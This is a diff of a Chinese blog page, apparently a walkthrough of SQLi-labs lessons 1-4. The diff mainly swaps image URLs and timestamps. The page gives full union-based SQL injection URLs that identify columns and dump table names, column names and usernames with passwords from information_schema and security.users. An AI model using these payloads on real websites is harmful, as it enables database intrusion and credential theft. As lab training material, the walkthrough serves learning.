@@ -150,6 +150,8 @@
             
             <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
             
+            <li><a target="_blank" href="/www.bugsafe.cn">Poache’s</a></li>
+            
         </ul>
     </div>
 </div>
@@ -726,7 +728,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2018-10-15 08:40:51'>2018-04-02 16:13</time>
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:15'>2018-04-02 16:13</time>
         
     </div>
     <div class="article-meta">
@@ -779,7 +781,7 @@
         <h1 id="Sqli-labs-1-4"><a href="#Sqli-labs-1-4" class="headerlink" title="Sqli-labs  1-4"></a>Sqli-labs  1-4</h1><p>[TOC]</p>
 <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能通过结构化查询来管理大型数据库。脚本小子们一定已经动手体验了类似SQL注入等这样的操作，虽然他们可能已经通过使用自动化工具例如SQL Map或者SQLNinja来实施攻击，但却还不知它真正的原理。在这篇简短的教程里，我将会尽力让你对SQL 注入是怎样工作的，攻击是怎样发生的以及什么是应用程序SQL漏洞有一个深入的理解。我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。</a></p>
 <p>##安装<br>从<a href="https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache</a> webroot 文件夹（htddocs，/var/www） 打开sql-connections文件夹下的“db-creds.inc”文件修改mysql用户名和密码为你自己的打开浏览器，通过localhost的index.html访问文件夹 点击setup/resetDB 链接在你的mysql中创造数据库<br>   开始游戏！</p>
-<h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170021_645.png" alt=""></p>
+<h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170021_645.png" alt=""></p>
 <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1</p>
 <p>对出错信息分析：<br>near ‘’1\’ LIMIT 0,1’ at line 1</p>
 <p>最外层的单引号是标识错误的，将其隔离</p>
@@ -788,15 +790,15 @@
 <pre><code>select uername,password from talble where id = &#39;input&#39;
 -----&gt;
 select uername,password from talble where id = &#39;input 攻击代码&#39;
-</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 3–+<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 4–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170024_632.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,2,3–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170025_607.png" alt=""></p>
+</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 3–+<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 4–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170024_632.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,2,3–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170025_607.png" alt=""></p>
 <blockquote>
 <p>使用union语句查询时，必须使前面的语句查询出错(例如id=-1，而id中并没有为-1的)，以为当查询出错时，sql语句结果为空，也就会显示我们构造的sql语句所查询的内容，即union之后语句的执行结果。</p>
 </blockquote>
-<p>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,version(),database()–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170027_645.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201803170038_567.png" alt=""></p>
+<p>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,version(),database()–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170027_645.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170038_567.png" alt=""></p>
 <p>6.暴列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(column_name) from information_schema.<strong>columns</strong> where <strong>table_name</strong>=’users’–+</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201803170039_473.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(username,’:’,password) from security.users–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170043_887.png" alt=""></p>
-<h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a>‘<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170056_779.png" alt=""><br>在 id = 1后面添加’: 报语法错误</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170039_473.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(username,’:’,password) from security.users–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170043_887.png" alt=""></p>
+<h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a>‘<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170056_779.png" alt=""><br>在 id = 1后面添加’: 报语法错误</p>
 <pre><code> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1
 </code></pre><p>错误分析：</p>
 <pre><code>near &#39;&#39; LIMIT 0,1&#39; at line 1
@@ -804,9 +806,9 @@ select uername,password from talble where id = &#39;input 攻击代码&#39;
 <pre><code>near &#39;     &#39; LIMIT 0,1     &#39; at line 1
 </code></pre><p>中间的单引号是手动输入的，说明出错在这里，也就证实了sql语句：</p>
 <pre><code>select username,password from table where id = input
-</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a> order by 4–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170100_90.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,3–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170101_674.png" alt=""><br>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,version(),database()–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170103_26.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201803170105_974.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170107_284.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(username,’:’,password) from security.users<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170110_138.png" alt=""></p>
-<h2 id="less-3-GET-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET -基于错误的GET单引号变形字符型注入"></a>less 3 GET -基于错误的GET单引号变形字符型注入</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-3/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803170121_987.png" alt=""></p>
+</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a> order by 4–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170100_90.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,3–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170101_674.png" alt=""><br>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,version(),database()–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170103_26.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170105_974.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170107_284.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(username,’:’,password) from security.users<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170110_138.png" alt=""></p>
+<h2 id="less-3-GET-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET -基于错误的GET单引号变形字符型注入"></a>less 3 GET -基于错误的GET单引号变形字符型注入</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-3/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=1\</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170121_987.png" alt=""></p>
 <pre><code>MySQL server version for the right syntax to use near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1
 </code></pre><p>错误分析：</p>
 <pre><code>near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1
@@ -822,8 +824,8 @@ select uername,password from talble where id = &#39;input 攻击代码&#39;
 <p>2.确定字段个数</p>
 <p>3.判断回显位(2,3处为显示位)</p>
 <p>4.爆数据库名字、连接账号信息</p>
-<p>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security”–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170130_646.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users”–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170130_127.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(username,’:’,password) from security.users–+</p>
-<h2 id="less-4：GET-基于错误-双引号-字符型"><a href="#less-4：GET-基于错误-双引号-字符型" class="headerlink" title="less-4：GET-基于错误-双引号-字符型"></a>less-4：GET-基于错误-双引号-字符型</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-4/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803170137_745.png" alt=""><br> MySQL server version for the right syntax to use near ‘“1\”) LIMIT 0,1’ at line 1<br>错误分析：</p>
+<p>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security”–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170130_646.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users”–+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170130_127.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(username,’:’,password) from security.users–+</p>
+<h2 id="less-4：GET-基于错误-双引号-字符型"><a href="#less-4：GET-基于错误-双引号-字符型" class="headerlink" title="less-4：GET-基于错误-双引号-字符型"></a>less-4：GET-基于错误-双引号-字符型</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-4/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=1\</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170137_745.png" alt=""><br> MySQL server version for the right syntax to use near ‘“1\”) LIMIT 0,1’ at line 1<br>错误分析：</p>
 <pre><code>near &#39;&quot;3\&quot;) LIMIT 0,1&#39; at line 1
 </code></pre><p>先分离最外层的单引号，那是用来标识错误信息的</p>
 <pre><code>near &#39;           &quot;  3\  &quot;) LIMIT 0,1             &#39; at line 1
@@ -831,7 +833,7 @@ select uername,password from talble where id = &#39;input 攻击代码&#39;
 <p>说明sql语句中应该有 (“”)   （ 括号也配对）</p>
 <p>再次猜测sql语句：</p>
 <pre><code>select * username,password from table where id = (&quot;input&quot;)
-</code></pre><p>2.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-4/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=-1</a>“) UNION SELECT 1,2,3 –+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170145_156.png" alt=""></p>
+</code></pre><p>2.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-4/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=-1</a>“) UNION SELECT 1,2,3 –+<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803170145_156.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 951207194@qq.com </span>
@@ -849,7 +851,7 @@ select uername,password from talble where id = &#39;input 攻击代码&#39;
     <p><span>文章字数:</span><span class="post-count">1,655</span></p>
     <p><span>本文作者:</span><a href="javascript:void(0)" title="Mang0">Mang0</a></p>
     <p><span>发布时间:</span>2018-04-02, 16:13:07</p>
-    <p><span>最后更新:</span>2018-10-15, 08:40:51</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:15</p>
     <span>原始链接:</span><a class="post-url" href="/archives/239c6225/" title="Sqli-labs  1-4">http://mang0.me/archives/239c6225/</a>
     <p>
         <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
